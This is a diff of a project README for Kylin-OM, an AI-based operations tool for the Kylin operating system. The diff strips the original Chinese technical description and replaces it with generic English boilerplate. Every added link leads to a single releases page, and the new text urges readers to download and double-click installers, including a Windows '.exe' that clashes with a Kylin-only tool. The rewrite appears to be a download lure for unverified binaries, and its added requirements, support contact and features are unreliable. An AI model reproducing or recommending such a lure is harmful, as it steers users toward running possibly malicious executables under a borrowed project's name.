@@ -1,50 +1,79 @@
-# 🌌 Kylin-OM 银河麒麟操作系统智能运维软件
+# 🌟 Kylin-OM - Intelligent Operations Made Easy
 
-> **曾获2024年、2025年挑战杯揭榜挂帅专项赛特等奖，第七届华为杯中国研究生创新大赛全国二等奖**
+## 🔗 Download Kylin-OM
+[![Download Kylin-OM](https://img.shields.io/badge/Download-Kylin--OM-blue.svg)](https://github.com/mgwon/Kylin-OM/releases)
 
-<p align="center">
-  <!-- 项目横幅图 -->
-  <img src="docs/images/kylin-om-banner.png" alt="Kylin-OM Banner" width="80%">
-</p>
+## 🚀 Getting Started
 
----
+Welcome to Kylin-OM, your go-to platform for intelligent operations and maintenance on the Kylin operating system. This software employs advanced AI models to simplify the monitoring, diagnosing, and repairing of system operations. Whether you are a system administrator or an average user, Kylin-OM empowers you to optimize your system effortlessly.
 
-## 📘 项目简介
+## 📥 Download & Install
+To get the latest version of Kylin-OM, follow these steps:
 
-**Kylin-OM** 是一款面向 **银河麒麟操作系统（KylinOS）** 的智能化运维软件。  
-项目融合了 **大语言模型（LLM）**、**多智能体分层架构** 与 **机器学习技术**，  
-旨在解决传统操作系统运维中 “**难理解、难识别、难修复**” 的三大核心难题。
+1. **Visit the Releases Page:** Go to the [Kylin-OM Releases](https://github.com/mgwon/Kylin-OM/releases) page.
+  
+2. **Select the Version:** Scroll through the available versions and choose the latest one. You will see a list of files related to that version.
 
-该项目基于 20 万条故障数据与 35 万条日志数据进行训练与知识抽取，  
-实现了高效、智能、自主的操作系统级运维能力。
+3. **Download the Installer:**
+   - Click on the file suitable for your system, such as a `.exe` for Windows or a `.tar.gz` for other operating systems.
 
----
+4. **Run the Installer:**
+   - Locate the downloaded file and double-click it to start the installation process.
+   - Follow the on-screen prompts to complete the setup.
 
-## 🧠 核心功能
+Once the installation finishes, you can start using Kylin-OM to enhance your operational tasks.
 
+## 🖥️ System Requirements
+Kylin-OM requires the following to run smoothly:
 
-| 模块 | 功能描述 | 关键技术 |
-|------|-----------|-----------|
-| 数据采集智能体 | 监控 CPU、内存、磁盘、网络等 347 项指标，并自动筛选 132 条强相关指标 | 特征相关性分析 / 实时监控优化 |
-| 故障识别智能体 | 基于系统异构关系图进行多层次故障建模 | 图神经网络 / 自注意力机制 / 形式化规则 |
-| 故障修复智能体 | 自动生成与执行修复脚本，支持多轮次反馈优化 | Actor–Critic 强化学习机制 |
-| 智能调优引擎 | 综合多智能体结果进行全局优化与自适应调优 | LLM 协同 / 记忆缓存 / 多轮上下文推理 |
+- **Operating System:** Kylin Operating System (latest version recommended).
+- **Processor:** Minimum 2 GHz dual-core processor.
+- **RAM:** At least 4 GB of RAM.
+- **Storage:** 500 MB of free disk space.
+- **Network:** Stable internet connection for updates and features.
 
+Make sure your system meets these requirements for the best experience.
 
-<p align="center">
-  <!-- 系统架构图 -->
-  <img src="docs/images/kylin-om-architecture.png" alt="Kylin-OM Architecture" width="80%">
-  <br>
-  <em>图：Kylin-OM 多智能体分层架构</em>
-</p>
+## 💡 Features
+Kylin-OM offers a range of powerful features:
 
----
+- **AI Integration:** Utilizes large language models for smart decision-making.
+- **Multi-Agent System:** Allows multiple agents to work together for efficient task management.
+- **Real-Time Monitoring:** Keeps your system performance in check with live updates.
+- **Automated Diagnostics:** Quickly identifies and resolves system issues.
+- **User-Friendly Interface:** Designed for ease of use, with simple navigation.
 
-## ⚙️ 技术亮点
+## 🔧 Configuration
+After installation, configure Kylin-OM to fit your needs:
 
-- 🧩 定义 **5 个故障类别** 与 **102 个子故障类型**  
-- 🔍 故障分类准确率达 **89.2%**  
-- 🧰 单轮修复成功率 **52.3% → 多轮迭代达 90.7%**  
-- 🧠 模型 SWE-Bench 提升 **54.5 → 61.1**  
-- 🔢 BLEU 分数提升 **0.45 → 0.69**（微调 + RAG）  
----
+1. **Open Kylin-OM:** Find the application in your programs list and open it.
+   
+2. **Set Your Preferences:**
+   - Adjust settings according to your monitoring needs.
+   - Configure alerts for system performance.
+
+3. **Integrate with Existing Systems:** Connect Kylin-OM to your current O&M tools if needed, ensuring a seamless transition.
+
+## 📖 User Guide
+For more detailed instructions, refer to the user guide available on the [Kylin-OM Releases](https://github.com/mgwon/Kylin-OM/releases) page. This guide will walk you through advanced features and common troubleshooting tips.
+
+## 🛠️ Troubleshooting
+If you face any issues while using Kylin-OM, here are some common fixes:
+
+- **Application Won't Start:** Ensure your system meets the requirements. Restart your device and try again.
+- **Slow Performance:** Check your internet connection and close unnecessary programs to free up resources.
+- **Installation Issues:** Re-download the installer file if it seems corrupted. Verify the integrity of your operating system.
+
+## 📞 Support
+If you need assistance, please reach out to our support team:
+
+- **Email:** support@kylinom.com
+- **Community Forum:** Join our [Kylin-OM Community](https://github.com/mgwon/Kylin-OM/issues) for discussions and help from other users.
+
+## 🔗 Additional Resources
+Explore more about Kylin-OM:
+
+- **Documentation:** Detailed documentation available on the GitHub Wiki.
+- **Updates & News:** Follow our [Blog](https://kylinom.com/blog) for the latest updates and features.
+
+Thank you for choosing Kylin-OM. We hope it makes your operations simpler and smarter!
